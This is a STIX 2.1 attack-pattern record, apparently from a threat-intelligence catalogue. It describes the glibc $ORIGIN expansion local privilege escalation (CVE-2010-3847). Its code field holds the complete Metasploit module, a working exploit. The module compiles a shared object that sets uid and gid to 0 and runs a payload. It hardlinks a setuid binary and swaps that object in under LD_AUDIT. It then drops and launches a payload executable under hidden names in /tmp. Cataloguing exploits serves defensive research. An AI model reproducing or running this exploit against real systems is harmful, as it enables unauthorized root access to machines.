{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cc61386d-a0e0-42e7-a1e3-4e23e3734957",
    "created": "2024-08-14T16:58:53.466218Z",
    "modified": "2024-08-14T16:58:53.466222Z",
    "name": "\"glibc $ORIGIN Expansion Privilege Escalation\"",
    "description": " This module attempts to gain root privileges on Linux systems by abusing a vulnerability in the GNU C Library (glibc) dynamic linker.  glibc `ld.so` versions before 2.11.3, and 2.12.x before 2.12.2 does not properly restrict use of the `LD_AUDIT` environment variable when loading setuid executables which allows control over the `$ORIGIN` library search path resulting in execution of arbitrary shared objects.  This module opens a file descriptor to the specified suid executable via a hard link, then replaces the hard link with a shared object before instructing the linker to execute the file descriptor, resulting in arbitrary code execution.  The specified setuid binary must be readable and located on the same file system partition as the specified writable directory.  This module has been tested successfully on:  glibc 2.5 on CentOS 5.4 (x86_64); glibc 2.5 on CentOS 5.5 (x86_64); glibc 2.12 on Fedora 13 (i386); and glibc 2.5-49 on RHEL 5.5 (x86_64).  Some versions of `ld.so`, such as the version shipped with Ubuntu 14 hit a failed assertion in `dl_open_worker` causing exploitation to fail.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/glibc_origin_expansion_priv_esc.rb",
            "external_id": "glibc_origin_expansion_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3847"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2010/Oct/257"
        },
        {
            "source_name": "reference",
            "url": "https://www.ubuntu.com/usn/usn-1009-1"
        },
        {
            "source_name": "reference",
            "url": "https://security-tracker.debian.org/tracker/CVE-2010-3847"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/security/cve/CVE-2010-3847"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Local::Linux\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"glibc '$ORIGIN' Expansion Privilege Escalation\",\n        'Description' => %q{\n          This module attempts to gain root privileges on Linux systems by abusing\n          a vulnerability in the GNU C Library (glibc) dynamic linker.\n\n          glibc `ld.so` versions before 2.11.3, and 2.12.x before 2.12.2 does not\n          properly restrict use of the `LD_AUDIT` environment variable when loading\n          setuid executables which allows control over the `$ORIGIN` library search\n          path resulting in execution of arbitrary shared objects.\n\n          This module opens a file descriptor to the specified suid executable via\n          a hard link, then replaces the hard link with a shared object before\n          instructing the linker to execute the file descriptor, resulting in\n          arbitrary code execution.\n\n          The specified setuid binary must be readable and located on the same\n          file system partition as the specified writable directory.\n\n          This module has been tested successfully on:\n\n          glibc 2.5 on CentOS 5.4 (x86_64);\n          glibc 2.5 on CentOS 5.5 (x86_64);\n          glibc 2.12 on Fedora 13 (i386); and\n          glibc 2.5-49 on RHEL 5.5 (x86_64).\n\n          Some versions of `ld.so`, such as the version shipped with Ubuntu 14,\n          hit a failed assertion in `dl_open_worker` causing exploitation to fail.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Tavis Ormandy', # Discovery and exploit\n          'bcoles' # Metasploit\n        ],\n        'DisclosureDate' => '2010-10-18',\n        'Platform' => 'linux',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Targets' => [\n          ['Automatic', {}],\n          ['Linux x86', { 'Arch' => ARCH_X86 }],\n          ['Linux x64', { 'Arch' => ARCH_X64 }]\n        ],\n        'References' => [\n          ['CVE', '2010-3847'],\n          ['BID', '44154'],\n          ['EDB', '15274'],\n          ['URL', 'https://seclists.org/fulldisclosure/2010/Oct/257'],\n          ['URL', 'https://www.ubuntu.com/usn/usn-1009-1'],\n          ['URL', 'https://security-tracker.debian.org/tracker/CVE-2010-3847'],\n          ['URL', 'https://access.redhat.com/security/cve/CVE-2010-3847']\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options [\n      OptString.new('SUID_EXECUTABLE', [true, 'Path to a suid executable', '/bin/ping'])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def suid_exe_path\n    datastore['SUID_EXECUTABLE']\n  end\n\n  def check\n    v = Rex::Version.new glibc_version\n    return CheckCode::Safe('Could not determine the GNU C library version') if v.eql? ''\n\n    if v >= Rex::Version.new('2.12.2') ||\n       (v >= Rex::Version.new('2.11.3') && v < Rex::Version.new('2.12'))\n      return CheckCode::Safe(\"GNU C Library version #{v} is not vulnerable\")\n    end\n\n    vprint_good \"GNU C Library version #{v} appears vulnerable\"\n\n    return CheckCode::Safe(\"#{suid_exe_path} file not found\") unless file? suid_exe_path\n    return CheckCode::Detected(\"#{suid_exe_path} is not setuid\") unless setuid? suid_exe_path\n\n    vprint_good \"#{suid_exe_path} is setuid\"\n\n    return CheckCode::Detected(\"#{suid_exe_path} is not readable\") unless readable?(suid_exe_path)\n\n    vprint_good \"#{suid_exe_path} is readable\"\n\n    CheckCode::Appears\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    chmod path\n  end\n\n  def exploit\n    check_status = check\n\n    if check_status == CheckCode::Appears\n      print_good 'The target appears to be vulnerable'\n    elsif check_status == CheckCode::Detected\n      fail_with Failure::BadConfig, \"#{suid_exe_path} is not suid or not readable\"\n    else\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    suid_partition = cmd_exec \"df -P -- '#{suid_exe_path}' | awk 'NR==2 {print $1}'\"\n    base_partition = cmd_exec \"df -P -- '#{base_dir}' | awk 'NR==2 {print $1}'\"\n    if suid_partition == base_partition\n      vprint_good \"'#{suid_exe_path}' and '#{base_dir}' are located on the same partition\"\n    else\n      print_warning \"'#{suid_exe_path}' and '#{base_dir}' are not located on the same partition\"\n    end\n\n    payload_name = \".#{rand_text_alphanumeric 5..10}\"\n    payload_path = \"#{base_dir}/#{payload_name}\"\n\n    # Set target\n    uname = kernel_hardware\n    vprint_status \"System architecture is #{uname}\"\n    if target.name.eql? 'Automatic'\n      case uname\n      when 'x86_64'\n        my_target = targets[2]\n      when /x86/, /i\\d86/\n        my_target = targets[1]\n      else\n        fail_with Failure::NoTarget, 'Unable to automatically select a target'\n      end\n    else\n      my_target = target\n    end\n    print_status \"Using target: #{my_target.name}\"\n\n    cpu = nil\n    case my_target['Arch']\n    when ARCH_X86\n      cpu = Metasm::Ia32.new\n    when ARCH_X64\n      cpu = Metasm::X86_64.new\n    else\n      fail_with Failure::NoTarget, 'Target is not compatible'\n    end\n\n    # Compile shared object\n    so_stub = %|\n      extern int setuid(int);\n      extern int setgid(int);\n      extern int system(const char *__s);\n\n      void init(void) __attribute__((constructor));\n\n      void __attribute__((constructor)) init() {\n        setuid(0);\n        setgid(0);\n        system(\"#{payload_path}\");\n      }\n    |\n\n    begin\n      so = Metasm::ELF.compile_c(cpu, so_stub).encode_string(:lib)\n    rescue StandardError => e\n      print_error \"Metasm encoding failed: #{$ERROR_INFO}\"\n      elog('Metasm encoding failed', error: e)\n      fail_with Failure::Unknown, 'Metasm encoding failed'\n    end\n\n    # Upload shared object\n    so_name = \".#{rand_text_alphanumeric 5..10}\"\n    so_path = \"#{base_dir}/#{so_name}\"\n    upload_and_chmodx so_path, so\n\n    # Upload exploit\n    link_name = \".#{rand_text_alphanumeric 5..10}\"\n    link_path = \"#{base_dir}/#{link_name}\"\n    fd = rand(3..9)\n    exp = %(\n      rm -rf '#{link_path}'\n      mkdir '#{link_path}'\n      ln #{suid_exe_path} #{link_path}/#{link_name}\n      exec #{fd}< #{link_path}/#{link_name}\n      ls -l /proc/$$/fd/#{fd}\n      rm -rf '#{link_path}'\n      ls -l /proc/$$/fd/#{fd}\n      mv #{so_path} #{link_path}\n      LD_AUDIT=\"\\\\$ORIGIN\" exec /proc/self/fd/#{fd}\n    )\n\n    exp_name = \".#{rand_text_alphanumeric 5..10}\"\n    exp_path = \"#{base_dir}/#{exp_name}\"\n    upload_and_chmodx exp_path, exp\n    register_file_for_cleanup link_path\n\n    # Upload payload\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    # Launch exploit\n    print_status 'Launching exploit...'\n    # The echo at the end of the command is required\n    # else the original session may die\n    output = cmd_exec \"#{exp_path}& echo \"\n    output.each_line { |line| vprint_status line.chomp }\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-18",
    "x_mitre_platforms": [
        "linux'"
    ]
}